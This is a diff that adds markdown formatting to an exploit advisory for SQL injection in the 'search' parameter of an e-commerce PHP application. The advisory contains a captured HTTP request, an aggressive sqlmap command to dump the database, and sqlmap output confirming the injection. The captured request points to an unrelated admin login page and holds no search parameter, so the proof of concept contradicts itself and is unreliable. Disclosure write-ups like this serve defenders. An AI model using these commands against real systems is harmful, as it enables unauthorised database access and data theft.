@@ -7,14 +7,12 @@
 + Tested on: Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
 
 ## Description:
-----------------------
 
 E-Commerce Website 1.0 allows SQL Injection via parameter 'search' in "/Electricks/Electricks-shop/index_search.php".
 Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.
 
 
 ## Proof of Concept:
-----------------------
 
 Go to the Search Product textbox: "http://localhost/Electricks/Electricks-shop/index_search.php"
 Fill Enter product name and search.
@@ -25,7 +23,7 @@ Use sqlmap to exploit.
 ---
 
 Captured Burp request:
-
+```
 POST /libsystem/admin/login.php HTTP/1.1
 Host: localhost
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
@@ -38,13 +36,15 @@ Referer: http://localhost/libsystem/admin/
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
 
 username=admin&login=&password=Pass
+```
 
 ---
 
 In sqlmap, use 'search' parameter to dump the database. 
 
-python sqlmap.py -r r.txt -p search --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
+`python sqlmap.py -r r.txt -p search --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db`
 
+```
 ---
 Parameter: search (POST)
     Type: boolean-based blind
@@ -68,6 +68,7 @@ web application technology: PHP 8.1.6, Apache 2.4.53
 back-end DBMS: MySQL >= 5.0 (MariaDB fork)
 [19:47:41] [INFO] fetching current database
 current database: 'electricks'
+```
 
 current database: electricks
 
